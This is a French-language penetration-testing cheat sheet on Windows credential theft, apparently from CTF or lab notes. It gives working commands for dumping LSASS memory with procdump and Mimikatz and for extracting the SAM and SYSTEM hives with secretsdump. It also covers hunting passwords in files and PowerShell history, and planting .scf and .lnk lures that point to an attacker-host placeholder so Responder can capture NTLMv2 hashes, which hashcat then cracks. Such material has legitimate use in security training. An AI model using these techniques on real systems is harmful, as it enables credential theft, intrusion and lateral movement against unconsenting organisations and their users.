# 04-Vol d'Identifiants

La récupération d'identifiants (en clair, hashes, tickets Kerberos) est une méthode clé pour l'escalade de privilèges ou le mouvement latéral.

## Dump de LSASS (SeDebugPrivilege requis)
Le processus LSASS (Local Security Authority Subsystem Service) stocke les identifiants en mémoire.
```powershell
# S'assurer que SeDebugPrivilege est activé
# whoami /priv
# Import-Module .\Enable-Privilege.ps1; Enable-Privilege -Name "SeDebugPrivilege" # Si nécessaire

# Utiliser procdump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Transférer lsass.dmp sur la machine attaquante

# Utiliser Mimikatz sur la machine attaquante
# mimikatz # sekurlsa::minidump lsass.dmp
# mimikatz # sekurlsa::logonPasswords
```
Ou directement avec Mimikatz sur la cible (plus risqué, peut être détecté) :
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

## Extraction des Hashes des Ruches du Registre (SAM/SYSTEM/SECURITY)
Nécessite des privilèges élevés (souvent SYSTEM) ou `SeBackupPrivilege`.

**Avec SeBackupPrivilege :**
```powershell
# whoami /priv # Vérifier SeBackupPrivilege
reg save hklm\sam C:\temp\sam.hive
reg save hklm\security C:\temp\security.hive
reg save hklm\system C:\temp\system.hive
# Transférer les fichiers .hive sur la machine attaquante
```
Sur la machine attaquante :
```bash
impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
```

**Si déjà SYSTEM :**
Les mêmes commandes `reg save` fonctionnent.
Alternativement, `impacket-secretsdump` peut cibler une machine distante si les partages administratifs sont accessibles.

## Recherche de Mots de Passe dans des Fichiers
```powershell
# Rechercher des mots de passe dans des types de fichiers courants
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
findstr /SIM /C:"contraseña" *.txt *.ini *.cfg *.config *.xml # Espagnol
findstr /SIM /C:"motdepasse" *.txt *.ini *.cfg *.config *.xml # Français
# Adapter les mots-clés : "pwd", "creds", "credentials", "secret", "token", "apikey"

#Chercher des password manager
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
#Fichiers de config pour XAMPP
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
#Chercher pour des fichiers sensibles:
Get-ChildItem -Path C:\Users\username\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

# Exemples de fichiers spécifiques à vérifier
gc C:\Windows\Panther\Unattend.xml
gc C:\Windows\Panther\Unattend\Unattend.xml
gc C:\Windows\System32\sysprep\Unattend.xml
gc C:\unattend.xml
# Rechercher les fichiers de configuration d'applications (ex: web.config, settings.ini)
dir /s /b *pass*.txt *cred* *vnc* *.config* # Exemple de Sniper Box
type "C:\chemin\vers\config.xml" # Exemple Authority Box
type "..\user\db.php" # Exemple Sniper Box
```

## Historique PowerShell
```powershell
# Chemin de l'historique PSReadline
(Get-PSReadLineOption).HistorySavePath
# Afficher l'historique de l'utilisateur courant
Get-Content (Get-PSReadLineOption).HistorySavePath
# Afficher l'historique de tous les utilisateurs (nécessite des droits)
foreach($userprofile in (Get-ChildItem C:\Users -Directory)){
    $historyFile = Join-Path $userprofile.FullName "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if(Test-Path $historyFile){
        Get-Content $historyFile -ErrorAction SilentlyContinue
    }
}
```

## Identifiants PowerShell Stockés (Credential Manager / XML)
```powershell
# Importer des identifiants exportés via Export-Clixml
# $credential = Import-Clixml -Path 'C:\chemin\vers\credential.xml'
# $credential.GetNetworkCredential().UserName
# $credential.GetNetworkCredential().Password

# Vérifier le gestionnaire d'identification Windows (Credential Manager)
cmdkey /list
```

## Capture de Hashes NTLMv2 via des Fichiers SCF sur un Partage
Crée un fichier `.scf` sur un partage réseau. Lorsqu'un utilisateur navigue vers ce partage, Windows Explorer tente de charger l'icône depuis un chemin UNC pointant vers la machine de l'attaquant, initiant une session SMB et envoyant le hash NTLMv2.

**1. Créer le fichier `.scf`**
Nommez le fichier avec `@` au début (ex: `@Details.scf`) pour qu'il apparaisse en haut du répertoire.
Contenu du fichier (ex: `icon.scf`):
```ini
[Shell]
Command=2
IconFile=\\<IP_ATTAQUANT>\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
Placez ce fichier sur un partage accessible par la victime.

**2. Lancer Responder sur la machine attaquante**
```bash
sudo responder -I <interface> -wrf -v
# Ou avec -I tun0 si via VPN/tunnel
```
Attendez que l'utilisateur accède au partage. Responder capturera le hash.
```
[SMB] NTLMv2-SSP Username : DOMAINE\Utilisateur
[SMB] NTLMv2-SSP Hash     : Utilisateur::DOMAINE:HASH_NTLMv2:BLOB:01010...
```

**3. Cracker le Hash**
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

## Capture de Hashes NTLMv2 via un Fichier `.lnk` Malveillant
Similaire aux fichiers SCF, mais fonctionne sur des versions plus récentes de Windows (ex: Server 2019) où les SCF peuvent être moins efficaces.

**1. Créer le fichier `.lnk` via PowerShell**
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\chemin\sur\partage\ou\local\MonDocumentImportant.lnk") # Placer sur un partage ou envoyer à la victime
$lnk.TargetPath = "\\<IP_ATTAQUANT>\share\dummy.file" # Peut être n'importe quel fichier, même inexistant
# $lnk.IconLocation = "%SystemRoot%\System32\SHELL32.dll,3" # Icône de dossier
$lnk.IconLocation = "\\<IP_ATTAQUANT>\share\icon.ico" # Pour forcer la connexion pour l'icône
$lnk.WindowStyle = 1
$lnk.Description = "Ce fichier déclenchera une requête d'authentification."
# $lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
Placez ce fichier `.lnk` sur un partage réseau accessible par la victime.

**2. Lancer Responder**
Comme pour la technique SCF, lancez Responder et attendez que l'utilisateur interagisse avec le fichier `.lnk` (même un simple affichage dans l'explorateur peut suffire si `IconLocation` pointe vers l'attaquant).

## Flux de Données Alternatifs (ADS - Alternate Data Streams)
Bien que principalement une technique de dissimulation, les ADS peuvent être utilisés pour stocker des identifiants ou des outils.
Exemple (Jeeves Box - lire un ADS) :
```bash
# Lister les flux de données alternatifs
dir /R

# Lire le contenu d'un flux de données alternatif
more < hm.txt:root.txt
# (Syntaxe : more < fichier:flux)
```
Cette technique est plus pour la découverte d'informations cachées que pour le vol direct d'identifiants système, mais elle est pertinente pour la recherche de secrets. 
